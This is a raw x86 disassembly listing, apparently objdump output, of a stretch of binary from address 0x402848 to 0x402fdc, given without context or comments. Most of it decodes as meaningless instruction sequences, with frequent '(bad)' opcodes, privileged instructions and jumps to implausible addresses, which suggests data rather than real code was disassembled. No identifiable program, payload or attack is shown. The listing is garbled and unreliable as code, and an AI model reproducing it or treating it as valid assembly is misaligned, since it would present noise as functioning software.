  402848:	pop    esi
  402849:	leavew 
  40284b:	inc    ebp
  40284c:	sbb    BYTE PTR [ebp-0x761326ab],cl
  402852:	in     al,dx
  402853:	xchg   esp,eax
  402854:	push   esi
  402855:	shl    al,0x66
  402858:	add    DWORD PTR [ebp+0x1],0x38df008d
  40285f:	mov    DWORD PTR [edi],ecx
  402861:	cwde   
  402862:	or     cl,BYTE PTR [ecx-0x767a6600]
  402868:	setl   BYTE PTR [edx]
  40286b:	inc    ebp
  40286c:	add    BYTE PTR [edi],cl
  40286e:	test   DWORD PTR [ebp+0xf],ecx
  402871:	xor    edi,edx
  402873:	add    eax,DWORD PTR [eax]
  402875:	xor    ecx,DWORD PTR [ebx+0x458866]
  40287b:	mov    eax,DWORD PTR [ebp-0x1848f010]
  402881:	test   al,0x0
  402883:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40288a:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  402890:	add    BYTE PTR [eax-0x57f076aa],ch
  402896:	rol    DWORD PTR [ebp+0x0],1
  402899:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40289f:	inc    DWORD PTR [ebx-0x748a0fe8]
  4028a5:	jmp    FWORD PTR [ebx]
  4028a7:	adc    BYTE PTR [ebx],al
  4028a9:	jne    0x4028ba
  4028ab:	call   DWORD PTR [eax-0x14]
  4028ae:	mov    DWORD PTR [ecx+0x1b7ffe4],eax
  4028b4:	push   cs
  4028b5:	sbb    al,0xca
  4028b7:	inc    ebp
  4028b8:	test   BYTE PTR [ebx-0x47ffe400],cl
  4028be:	dec    eax
  4028bf:	add    DWORD PTR [ebx+0x0],edx
  4028c2:	dec    ebp
  4028c3:	inc    ebp
  4028c4:	mov    esi,0x7f8cff8b
  4028c9:	add    BYTE PTR [ebp-0x74728b75],al
  4028cf:	add    al,0x83
  4028d1:	adc    esp,esi
  4028d3:	(bad)  
  4028d4:	and    edx,DWORD PTR ds:0x780f0703
  4028da:	jp     0x402867
  4028dc:	sysret 
  4028de:	pop    edx
  4028df:	add    eax,DWORD PTR [ebx]
  4028e1:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  4028e5:	sub    edx,DWORD PTR [ebx+eax*1]
  4028e8:	dec    ebp
  4028e9:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  4028ef:	ret    0x83
  4028f2:	clc    
  4028f3:	mov    esp,DWORD PTR [ebx]
  4028f5:	add    DWORD PTR [ebx],0x1c
  4028f8:	jnp    0x904fb477
  4028fe:	pop    ecx
  4028ff:	add    BYTE PTR [ebx],al
  402901:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  402906:	adc    al,0x1
  402908:	jge    0x40290a
  40290a:	mov    edx,edx
  40290c:	cld    
  40290d:	test   BYTE PTR [edi],bh
  40290f:	add    edi,edi
  402911:	add    BYTE PTR [esi],al
  402913:	neg    BYTE PTR [ebp-0x7c]
  402916:	add    DWORD PTR [eax],eax
  402918:	pop    es
  402919:	add    BYTE PTR [edi-0x48fff17a],dh
  40291f:	add    BYTE PTR [eax+eax*8],cl
  402922:	inc    ebp
  402923:	test   BYTE PTR [ebx+0x300fc00],al
  402929:	mov    esi,0xf80039
  40292e:	fisttp DWORD PTR [edi]
  402930:	mov    bh,0xda
  402932:	push   cs
  402933:	add    BYTE PTR [edi+0x4d340c39],dh
  402939:	test   bh,bh
  40293b:	add    ah,dh
  40293d:	add    cl,al
  40293f:	mov    cl,0x3
  402941:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  402947:	add    BYTE PTR [edx-0x36],dh
  40294a:	mov    ecx,DWORD PTR [esi]
  40294c:	call   0xef7e113
  402951:	or     al,0xb7
  402953:	dec    ebp
  402954:	or     al,0xf
  402956:	inc    ebp
  402957:	dec    eax
  402958:	add    DWORD PTR [ebx],0x8
  40295b:	(bad)  
  40295d:	scas   al,BYTE PTR es:[edi]
  40295e:	dec    ebp
  40295f:	add    BYTE PTR [ecx],bh
  402961:	(bad)  
  402962:	lock adc al,0x82
  402965:	mov    edi,edi
  402967:	call   0xff9c296b
  40296c:	rcl    BYTE PTR [edi-0x15],0x31
  402970:	xor    edi,DWORD PTR [edi+0x5e]
  402973:	adc    ebx,eax
  402975:	mov    eax,DWORD PTR gs:[eax]
  402978:	mov    edx,esi
  40297a:	nop
  40297b:	rol    BYTE PTR [eax],1
  40297d:	mov    bh,0x83
  40297f:	push   cs
  402980:	or     al,0xb7
  402982:	xor    ecx,DWORD PTR [esi+edx*2]
  402985:	sti    
  402986:	cmp    DWORD PTR [ecx+0xf],ebp
  402989:	dec    edx
  40298a:	test   DWORD PTR [ecx+0x318bec00],ecx
  402990:	or     al,0x41
  402992:	ret    
  402993:	or     DWORD PTR [esi+0x65],edi
  402996:	pop    eax
  402997:	add    BYTE PTR [ebp-0x32],dh
  40299a:	xor    ecx,eax
  40299c:	inc    eax
  40299d:	mov    bh,0x76
  40299f:	push   cs
  4029a0:	inc    eax
  4029a1:	mov    bh,0x3
  4029a3:	or     al,0x8
  4029a5:	sti    
  4029a6:	dec    eax
  4029a7:	sub    ecx,DWORD PTR [ebx+0x70892479]
  4029ad:	cld    
  4029ae:	mov    edi,DWORD PTR [ebp+0x18]
  4029b1:	mov    ecx,DWORD PTR [ebp-0x7b]
  4029b4:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  4029b8:	jne    0x40299e
  4029ba:	cmp    ebx,DWORD PTR [edi+esi*2]
  4029bd:	jns    0xff50263c
  4029c3:	pop    ecx
  4029c4:	jge    0x4029c5
  4029c6:	cmp    eax,edi
  4029c8:	cld    
  4029c9:	inc    ebp
  4029ca:	iret   
  4029cb:	or     BYTE PTR [eax-0x5],bh
  4029ce:	jae    0x402a4d
  4029d0:	(bad)  
  4029d2:	xor    al,0xf
  4029d4:	jmp    0x402a50
  4029d6:	mov    ecx,DWORD PTR [edi]
  4029d8:	lea    ebx,[edx-0x4f]
  4029db:	mov    esi,DWORD PTR [ebx]
  4029dd:	in     al,dx
  4029de:	test   BYTE PTR [ebp+0x27],0x83
  4029e2:	jge    0x4029ec
  4029e4:	add    edi,ebx
  4029e6:	mov    DWORD PTR [ebp-0x8],ecx
  4029e9:	cmp    eax,edi
  4029eb:	hlt    
  4029ec:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  4029f2:	jl     0x402a44
  4029f4:	clc    
  4029f5:	(bad)  
  4029f7:	js     0x402984
  4029f9:	push   DWORD PTR [edx-0x10]
  4029fc:	mov    eax,ecx
  4029fe:	clc    
  4029ff:	add    edi,edi
  402a01:	mov    DWORD PTR [eax],edx
  402a03:	call   0xfbd7f43
  402a08:	inc    edi
  402a09:	popa   
  402a0a:	jge    0x402a0b
  402a0c:	cmp    ebx,DWORD PTR [edi-0x4]
  402a0f:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  402a15:	rcr    BYTE PTR [esi-0x37],0xc9
  402a19:	push   ebp
  402a1a:	or     ah,ch
  402a1c:	push   ebp
  402a1d:	sub    ah,0x1
  402a20:	in     al,dx
  402a21:	add    BYTE PTR [edx-0x7ac7a14],bh
  402a27:	fist   DWORD PTR [ebp+0x57]
  402a2a:	(bad)  
  402a2b:	sbb    al,bh
  402a2d:	test   BYTE PTR [ebp+0x4500f800],al
  402a33:	inc    ebp
  402a34:	mov    edi,DWORD PTR [ebx]
  402a36:	cld    
  402a37:	je     0x402a86
  402a39:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  402a3f:	ror    BYTE PTR [ebx-0x74740315],0x78
  402a46:	adc    BYTE PTR [ebp-0x42],al
  402a49:	mov    ecx,DWORD PTR [eax]
  402a4b:	sbb    al,0x7
  402a4d:	push   eax
  402a4e:	inc    ebp
  402a4f:	mov    ecx,DWORD PTR [esi-0x7487adec]
  402a55:	add    edi,esp
  402a57:	or     BYTE PTR [ebx+0x890155],bl
  402a5d:	cld    
  402a5e:	mov    edi,0x372f7
  402a63:	jge    0x402a33
  402a65:	xor    eax,esi
  402a67:	mov    edi,eax
  402a69:	hlt    
  402a6a:	iret   
  402a6b:	pop    ebp
  402a6c:	inc    ebp
  402a6d:	jbe    0x402aaa
  402a6f:	cmp    ecx,DWORD PTR [edi]
  402a71:	adc    al,0x7b
  402a73:	push   es
  402a74:	add    BYTE PTR [edi+0x2fc7a8b],dh
  402a7a:	dec    ebp
  402a7b:	div    DWORD PTR [ebx]
  402a7d:	sbb    al,0x3
  402a7f:	mov    edi,DWORD PTR [ebx]
  402a81:	test   DWORD PTR [edi],ecx
  402a83:	je     0x402aee
  402a85:	mov    eax,DWORD PTR [eax]
  402a87:	or     BYTE PTR [ebx-0x76820302],cl
  402a8d:	cmp    eax,DWORD PTR [eax]
  402a8f:	jbe    0x402a91
  402a91:	mov    ebx,esi
  402a93:	or     al,0xdf
  402a95:	jg     0x402a62
  402a97:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  402a9e:	dec    ebp
  402a9f:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  402aa5:	je     0x402a85
  402aa7:	mov    edi,ebx
  402aa9:	mov    ebx,DWORD PTR [ebp-0xc]
  402aac:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  402ab2:	adc    dh,BYTE PTR [edx+0x55]
  402ab5:	jmp    0x402a42
  402ab7:	xor    edi,esp
  402ab9:	pop    edi
  402aba:	rcr    BYTE PTR [ebx+0x33],cl
  402abd:	ret    0x3
  402ac0:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  402ac6:	push   ebp
  402ac7:	cmp    BYTE PTR [ebx-0x2d760364],cl
  402acd:	cld    
  402ace:	xor    eax,DWORD PTR [ebp+0x3]
  402ad1:	cmp    edi,DWORD PTR [ecx]
  402ad3:	pushf  
  402ad4:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  402ada:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  402ae0:	pop    ebp
  402ae1:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  402ae7:	push   ebx
  402ae8:	add    ebx,DWORD PTR [ebp-0x75]
  402aeb:	push   esi
  402aec:	adc    BYTE PTR [ecx+0x4d],bl
  402aef:	push   ecx
  402af0:	xor    eax,edi
  402af2:	mov    eax,esi
  402af4:	in     al,0xeb
  402af6:	dec    ebp
  402af7:	add    ecx,DWORD PTR [ebx-0x317403b3]
  402afd:	nop
  402afe:	iret   
  402aff:	add    dh,dl
  402b01:	push   edi
  402b02:	dec    ebp
  402b03:	lahf   
  402b04:	mov    esi,DWORD PTR [edx]
  402b06:	add    esi,DWORD PTR [ebx]
  402b08:	add    esi,DWORD PTR [ebx]
  402b0a:	cmp    eax,DWORD PTR [ebx]
  402b0c:	je     0x402b11
  402b0e:	add    ecx,DWORD PTR [ecx+0xb4de808]
  402b14:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  402b1b:	pop    ebp
  402b1c:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  402b22:	lahf   
  402b23:	fbstp  TBYTE PTR [edx]
  402b25:	(bad)  [ecx+0x45020c84]
  402b2b:	add    BYTE PTR [edi],bh
  402b2d:	pop    ebp
  402b2e:	pushf  
  402b2f:	mov    ecx,DWORD PTR [ebx+0x75001080]
  402b35:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  402b3b:	ud0    ecx,DWORD PTR [edi-0x75]
  402b3f:	add    ah,bh
  402b41:	add    ecx,esi
  402b43:	or     bh,cl
  402b45:	dec    ebp
  402b46:	inc    ebp
  402b47:	mov    edi,DWORD PTR [ebx]
  402b49:	xor    esi,DWORD PTR [ebp+0x3]
  402b4c:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  402b52:	mov    edi,DWORD PTR [ebx]
  402b54:	fdiv   DWORD PTR [eax+eax*1-0x75]
  402b58:	push   eax
  402b5a:	or     al,0x5d
  402b5c:	inc    ebp
  402b5d:	imul   eax,edi,0x14
  402b60:	loopne 0x402b40
  402b62:	sbb    ebx,edi
  402b64:	jg     0x402b82
  402b66:	inc    ebp
  402b67:	jne    0x402b7c
  402b69:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  402b70:	(bad)  
  402b71:	adc    al,0xc7
  402b73:	fiadd  WORD PTR [ebp-0x21]
  402b76:	jne    0x402bd4
  402b78:	mov    edx,DWORD PTR [eax]
  402b7a:	clc    
  402b7b:	test   BYTE PTR [ebp+0x2],cl
  402b7e:	xor    eax,DWORD PTR [eax]
  402b80:	xor    eax,DWORD PTR [ebp-0x73]
  402b83:	mov    eax,DWORD PTR [ebx]
  402b85:	cld    
  402b86:	jb     0x402bcd
  402b88:	add    BYTE PTR [ebx+0x45],ch
  402b8b:	adc    al,0x8b
  402b8d:	rcr    eax,0x48
  402b90:	add    BYTE PTR [ebx],al
  402b92:	add    ecx,DWORD PTR [eax]
  402b94:	pmaxub mm1,mm3
  402b97:	dec    ebp
  402b98:	dec    DWORD PTR [ebx+0x5545fc24]
  402b9e:	xor    esi,DWORD PTR [ebx]
  402ba0:	add    eax,DWORD PTR [ebx]
  402ba2:	cmp    esi,DWORD PTR [ebx]
  402ba4:	hlt    
  402ba5:	mov    DWORD PTR [edi],ecx
  402ba7:	fadd   QWORD PTR [ebp+0x8]
  402baa:	xor    edx,edi
  402bac:	add    ebx,edi
  402bae:	cmp    ecx,edx
  402bb0:	clts   
  402bb2:	jp     0x402c01
  402bb4:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  402bba:	(bad)  
  402bbb:	xor    eax,edi
  402bbd:	add    eax,DWORD PTR [ebp+0xc]
  402bc0:	jne    0x402c07
  402bc2:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  402bc8:	xor    eax,DWORD PTR [eax]
  402bca:	lea    eax,[ebp+0x1]
  402bcd:	(bad)  
  402bce:	jb     0x402ba8
  402bd0:	add    BYTE PTR [ebp+0x45e9f845],al
  402bd6:	add    bh,bh
  402bd8:	add    BYTE PTR [eax*2+0x12018080],cl
  402bdf:	add    bh,al
  402be1:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  402be8:	pop    ebp
  402be9:	mov    DWORD PTR [ebx],esi
  402beb:	hlt    
  402bec:	add    ecx,eax
  402bee:	jmp    0x852c05
  402bf3:	inc    DWORD PTR [ebp+0xc]
  402bf6:	xor    eax,DWORD PTR [eax+0x890103]
  402bfc:	in     al,dx
  402bfd:	push   eax
  402bfe:	inc    ebp
  402bff:	mov    DWORD PTR [ebx],esi
  402c01:	hlt    
  402c02:	add    eax,DWORD PTR [ebp-0x77]
  402c05:	or     DWORD PTR [esi+eiz*2],0x4d
  402c09:	(bad)  
  402c0a:	mov    esp,eax
  402c0c:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  402c12:	enter  0x633,0x3
  402c16:	add    al,0x3b
  402c18:	mov    esp,esi
  402c1a:	in     al,dx
  402c1b:	and    eax,DWORD PTR [ebp+0x45]
  402c1e:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  402c24:	mov    ecx,esi
  402c26:	cld    
  402c27:	pushf  
  402c28:	dec    ebp
  402c29:	lahf   
  402c2a:	xor    esi,DWORD PTR [edx]
  402c2c:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  402c32:	mov    eax,DWORD PTR [ecx]
  402c34:	cld    
  402c35:	add    BYTE PTR [ebp-0x31],cl
  402c38:	xor    ebp,DWORD PTR [edi+0x50c15103]
  402c3e:	pop    ds
  402c3f:	mov    eax,ecx
  402c41:	cld    
  402c42:	sbb    dh,al
  402c44:	dec    ebp
  402c45:	(bad)  
  402c46:	mov    eax,DWORD PTR [ebp+0x10]
  402c49:	jne    0x402bcb
  402c4b:	mov    eax,DWORD PTR [ecx]
  402c4d:	fadd   DWORD PTR [eax]
  402c4f:	(bad)  
  402c50:	mov    bh,0xc7
  402c52:	push   ecx
  402c53:	fdiv   DWORD PTR [ebp-0x7a]
  402c56:	(bad)  
  402c57:	dec    DWORD PTR [eax]
  402c59:	call   FWORD PTR [ecx]
  402c5b:	inc    ebp
  402c5c:	inc    ebp
  402c5d:	xor    eax,DWORD PTR [ebx]
  402c5f:	add    ecx,DWORD PTR [eax]
  402c61:	cmp    ecx,DWORD PTR [ebp-0xc]
  402c64:	mov    edx,DWORD PTR [edi]
  402c66:	fadd   DWORD PTR [ebp+0x0]
  402c69:	mov    eax,DWORD PTR [ebx-0x39fd18]
  402c6f:	test   ah,dh
  402c71:	lahf   
  402c72:	push   ecx
  402c73:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  402c79:	out    dx,eax
  402c7a:	mov    eax,DWORD PTR [eax]
  402c7c:	or     al,0xc7
  402c7e:	(bad)  
  402c7f:	in     al,dx
  402c80:	(bad)  
  402c81:	sbb    eax,ecx
  402c83:	add    DWORD PTR [ebp+0x45],eax
  402c86:	jne    0x402c16
  402c88:	mov    eax,DWORD PTR [eax+ebp*8]
  402c8b:	mov    eax,esi
  402c8d:	cld    
  402c8e:	test   dh,bl
  402c90:	lahf   
  402c91:	fbstp  TBYTE PTR [edx]
  402c93:	ret    0x89
  402c96:	call   0x4e3c3d26
  402c9b:	(bad)  
  402c9c:	xor    eax,edi
  402c9e:	add    eax,DWORD PTR [ebp+0xf]
  402ca1:	mov    eax,ecx
  402ca3:	cld    
  402ca4:	dec    ebp
  402ca5:	(bad)  
  402ca6:	mov    edi,eax
  402ca8:	cdq    
  402ca9:	inc    ebp
  402caa:	inc    ebp
  402cab:	mov    esi,DWORD PTR [ebx]
  402cad:	cld    
  402cae:	lea    eax,[ebp+0x3]
  402cb1:	xor    esi,DWORD PTR [edx+0x3]
  402cb4:	add    BYTE PTR [ebx],bh
  402cb6:	inc    ebp
  402cb7:	je     0x402c44
  402cb9:	mov    esp,esp
  402cbb:	cwde   
  402cbc:	mov    BYTE PTR [ebp-0x39],0x8b
  402cc0:	add    al,0xe4
  402cc2:	(bad)  
  402cc4:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  402cca:	lock mov eax,DWORD PTR [ebp-0x14]
  402cce:	mov    eax,esi
  402cd0:	aam    0xc7
  402cd2:	jmp    0xd645:0x2972c1
  402cd9:	mov    eax,ebp
  402cdb:	in     al,dx
  402cdc:	inc    esi
  402cde:	mov    eax,edi
  402ce0:	cld    
  402ce1:	jmp    0x750f68b4
  402ce6:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  402ced:	mov    edi,eax
  402cef:	fadd   DWORD PTR [ebx]
  402cf1:	add    BYTE PTR [ebp+0xf],al
  402cf4:	xor    ecx,ecx
  402cf6:	add    edi,edi
  402cf8:	pop    edi
  402cf9:	hlt    
  402cfa:	pop    ebx
  402cfb:	push   eax
  402cfc:	ret    0xeb
  402cff:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  402d05:	mov    eax,DWORD PTR [ebp+0x10]
  402d08:	cmp    BYTE PTR [ecx+0xc7019c],cl
  402d0e:	fadd   st,st(0)
  402d10:	test   DWORD PTR [eax-0x8],edx
  402d13:	jne    0x402d5a
  402d15:	dec    DWORD PTR [ecx+0x45450c08]
  402d1b:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  402d21:	xor    eax,ecx
  402d23:	add    ebx,DWORD PTR [edi+0x568b323b]
  402d29:	clc    
  402d2a:	jne    0x402d3d
  402d2c:	add    ecx,DWORD PTR [ebp+0x3b]
  402d2f:	xor    ecx,DWORD PTR [edi]
  402d31:	lea    esp,[ecx]
  402d33:	add    DWORD PTR [eax],eax
  402d35:	jb     0x402cc2
  402d37:	add    BYTE PTR [eax],cl
  402d39:	inc    ebp
  402d3a:	jne    0x402d27
  402d3c:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  402d42:	or     al,0xc7
  402d44:	inc    ebp
  402d45:	scas   eax,DWORD PTR es:[edi]
  402d46:	aas    
  402d47:	mov    ebx,DWORD PTR [esp+eiz*8-0x741bfb75]
  402d4e:	jne    0x402d48
  402d50:	mov    eax,esi
  402d52:	or     al,0x9c
  402d54:	icebp  
  402d55:	lahf   
  402d56:	shl    DWORD PTR [edx],0xf2
  402d59:	mov    esi,DWORD PTR [esp+edi*8+0x33934d70]
  402d60:	lsl    ebp,bx
  402d63:	cmp    DWORD PTR [eax],eax
  402d65:	cdq    
  402d66:	mov    eax,DWORD PTR [ebp-0xba00f4]
  402d6c:	add    edx,DWORD PTR [ebp-0x60]
  402d6f:	mov    eax,DWORD PTR [eax]
  402d71:	call   0x81487b01
  402d76:	jge    0x402d16
  402d78:	sub    esi,DWORD PTR [edx]
  402d7a:	xor    al,0x33
  402d7c:	jge    0x402d67
  402d7e:	xor    edi,ebp
  402d80:	add    edi,edi
  402d82:	mov    DWORD PTR [ebp-0x24],ecx
  402d85:	xor    esi,edi
  402d87:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  402d8e:	jne    0x402d98
  402d90:	xor    eax,DWORD PTR [ebp+0x3]
  402d93:	jmp    0x402d1e
  402d95:	mov    edi,eax
  402d97:	cld    
  402d98:	mov    esi,0x5e85c7f0
  402d9e:	clc    
  402d9f:	leave  
  402da0:	xchg   edi,eax
  402da1:	or     al,0x0
  402da3:	push   ebp
  402da4:	mov    ebp,esp
  402da6:	cld    
  402da7:	in     al,dx
  402da8:	icebp  
  402da9:	(bad)  
  402daa:	jnp    0x402da8
  402dac:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  402db2:	jae    0x402def
  402db4:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  402dbb:	inc    ebp
  402dbc:	call   0x823ce54c
  402dc1:	pop    ecx
  402dc2:	call   DWORD PTR [ecx+0x0]
  402dc5:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  402dcb:	add    BYTE PTR [ebx+0x3082b8b],cl
  402dd1:	ret    0xf00f
  402dd4:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  402ddb:	inc    ebp
  402ddc:	loopne 0x402d69
  402dde:	jne    0x402de8
  402de0:	mov    esi,DWORD PTR [eax-0x20]
  402de3:	push   edi
  402de4:	jge    0x402e5b
  402de6:	xor    eax,edi
  402de8:	(bad)  
  402de9:	in     al,0x3e
  402deb:	test   DWORD PTR [edx-0x8],esi
  402dee:	add    BYTE PTR [ebp+0x75],al
  402df1:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  402df7:	xor    esi,DWORD PTR [ebx]
  402df9:	xor    eax,DWORD PTR [ebx]
  402dfb:	add    edi,DWORD PTR [ebx]
  402dfd:	cmp    DWORD PTR [ebp-0x39],esi
  402e00:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  402e06:	xor    eax,DWORD PTR [eax]
  402e08:	add    eax,DWORD PTR [eax]
  402e0a:	cmp    esi,DWORD PTR [ebp+0x75]
  402e0d:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  402e13:	add    BYTE PTR [ecx],al
  402e15:	add    BYTE PTR [ebx+0x4d8b0275],al
  402e1b:	or     al,0x75
  402e1d:	ja     0x402daa
  402e1f:	mov    esi,esp
  402e21:	cld    
  402e22:	pop    ebp
  402e23:	stc    
  402e24:	mov    edi,edx
  402e26:	in     al,0x75
  402e28:	jge    0x402e65
  402e2a:	mov    ecx,DWORD PTR [edi]
  402e2c:	or     al,0xc4
  402e2e:	icebp  
  402e2f:	add    BYTE PTR [ebx+ecx*4-0xe6c038c],bh
  402e36:	jae    0x402e2a
  402e38:	add    esi,DWORD PTR [ebp-0xc]
  402e3b:	push   ebx
  402e3c:	jne    0x402e83
  402e3e:	mov    edi,DWORD PTR ds:0xe9f19c04
  402e44:	repnz add BYTE PTR [ebp+0x0],bl
  402e48:	cmp    esi,DWORD PTR [ebp+0xf]
  402e4b:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  402e4f:	clc    
  402e50:	pop    ebx
  402e51:	repnz inc ebp
  402e53:	out    dx,eax
  402e54:	pop    edi
  402e55:	test   DWORD PTR [ebx],0x33fe456d
  402e5b:	pop    esp
  402e5c:	add    ecx,DWORD PTR [eax]
  402e5e:	pop    esi
  402e5f:	jge    0x402e23
  402e61:	(bad)  
  402e63:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  402e69:	add    BYTE PTR [ebp+0x75],al
  402e6c:	cmp    BYTE PTR [ebx+0x30c7ec9c],cl
  402e72:	fdivr  st(2),st
  402e74:	test   esi,edi
  402e76:	clc    
  402e77:	mov    bh,0x45
  402e79:	rcl    DWORD PTR [ebx+0xc],0xbe
  402e7d:	stc    
  402e7e:	or     BYTE PTR [ebp+0x7],bh
  402e81:	mov    esi,eax
  402e83:	in     al,dx
  402e84:	lahf   
  402e85:	jne    0x402eb9
  402e87:	mov    eax,DWORD PTR [ebx]
  402e89:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  402e8f:	lahf   
  402e90:	xor    esi,DWORD PTR [edx]
  402e92:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  402e98:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  402e9e:	mov    esi,edx
  402ea0:	lock inc cl
  402ea3:	push   ss
  402ea4:	inc    ebp
  402ea5:	jne    0x402e28
  402ea7:	mov    esi,eax
  402ea9:	in     al,dx
  402eaa:	mov    ch,0xf1
  402eac:	clc    
  402ead:	repnz inc ebp
  402eaf:	dec    BYTE PTR [ebx-0x3e8a07f8]
  402eb5:	mov    eax,DWORD PTR [ebp-0x24]
  402eb8:	cmp    DWORD PTR [esi],0xff85c3f8
  402ebe:	clc    
  402ebf:	call   0x5dcbce09
  402ec4:	hlt    
  402ec5:	add    ecx,eax
  402ec7:	clc    
  402ec8:	inc    ebp
  402ec9:	jne    0x402e4c
  402ecb:	mov    esi,esp
  402ecd:	clc    
  402ece:	test   DWORD PTR [ebp-0x8],ebx
  402ed1:	xor    eax,DWORD PTR [ebp+0x3b]
  402ed4:	mov    esi,ebx
  402ed6:	in     al,dx
  402ed7:	xchg   ebp,eax
  402ed8:	rol    DWORD PTR [ecx],0x45
  402edb:	sbb    BYTE PTR [ecx+0x58bec45],al
  402ee1:	cld    
  402ee2:	clc    
  402ee3:	pop    eax
  402ee4:	add    BYTE PTR [ebx],dh
  402ee6:	add    BYTE PTR [ebx],al
  402ee8:	mov    WORD PTR [ebp-0xc],ax
  402eec:	mov    ebx,esi
  402eee:	or     BYTE PTR [ebp-0x7b0040],al
  402ef4:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  402efa:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  402f00:	add    dl,al
  402f02:	mov    ecx,ecx
  402f04:	sbb    BYTE PTR [eax],cl
  402f06:	rcl    BYTE PTR [ebp-0x7c],0xec
  402f0a:	add    ebp,esp
  402f0c:	add    bh,al
  402f0e:	mov    edi,esp
  402f10:	and    BYTE PTR [ebp+0x4500f843],al
  402f16:	cmp    ax,cx
  402f19:	pushf  
  402f1a:	or     cl,BYTE PTR [ebx+0x5666fc00]
  402f20:	rcr    DWORD PTR [ecx+0x4d],0x51
  402f24:	xor    ax,WORD PTR [ecx]
  402f27:	mov    ebx,0x37285
  402f2c:	add    bl,al
  402f2e:	inc    ebp
  402f2f:	inc    ebp
  402f30:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  402f36:	add    eax,ebx
  402f38:	cmp    al,0x45
  402f3a:	inc    ebp
  402f3b:	push   edi
  402f3c:	mov    edi,DWORD PTR [ebp+0x50]
  402f3f:	mov    eax,eax
  402f41:	lock test BYTE PTR [ebp+0x3],cl
  402f45:	xor    eax,DWORD PTR [eax]
  402f47:	mov    DWORD PTR [ebp-0x10],eax
  402f4a:	cmp    BYTE PTR [ebp-0x74],al
  402f4d:	cmp    BYTE PTR [ebx-0x39742b64],cl
  402f53:	clc    
  402f54:	ret    
  402f55:	dec    ebp
  402f56:	inc    ebp
  402f57:	xor    ecx,DWORD PTR [ebx-0x78070377]
  402f5d:	inc    ebp
  402f5e:	add    eax,edi
  402f60:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  402f67:	dec    ebp
  402f68:	mov    esi,DWORD PTR [ebx]
  402f6a:	cld    
  402f6b:	mov    DWORD PTR [edi+0x4501f4],eax
  402f71:	cmp    al,0x10
  402f73:	pushf  
  402f74:	dec    ebp
  402f75:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  402f7b:	xor    esi,DWORD PTR [ebx]
  402f7d:	mov    DWORD PTR [edi+0x4501ec],eax
  402f83:	cmp    BYTE PTR [ebp-0x61],dl
  402f86:	push   edx
  402f87:	mov    eax,0x339555
  402f8c:	add    ecx,DWORD PTR [ecx+0x45712052]
  402f92:	inc    DWORD PTR [ebp-0x20aff0e0]
  402f98:	mov    eax,DWORD PTR [eax]
  402f9a:	in     al,0x8b
  402f9c:	inc    ecx
  402f9d:	or     al,0x8b
  402f9f:	rcl    BYTE PTR [eax-0x7c],0xc8
  402fa3:	add    eax,DWORD PTR [ebp+0x0]
  402fa6:	push   ecx
  402fa7:	inc    ebp
  402fa8:	call   0x4f3932
  402fad:	leave  
  402fae:	push   ebp
  402faf:	add    BYTE PTR [ebx+0x459466],cl
  402fb5:	mov    ecx,0x8b8a89
  402fba:	or     al,0x33
  402fbc:	jo     0x402f77
  402fbe:	(bad)  
  402fbf:	cmp    ecx,DWORD PTR [eax]
  402fc1:	add    al,ch
  402fc3:	add    eax,DWORD PTR [edi]
  402fc5:	mov    eax,DWORD PTR [eax]
  402fc7:	or     BYTE PTR [ebp+0x39],cl
  402fca:	mov    ecx,DWORD PTR [edi]
  402fcc:	cmp    al,0xa9
  402fce:	rol    DWORD PTR [eax],0xb7
  402fd1:	mov    edx,DWORD PTR [esp+edi*8]
  402fd4:	dec    esp
  402fd5:	dec    ebp
  402fd6:	sbb    BYTE PTR [ebx+0x418b084d],cl
  402fdc:	cld    
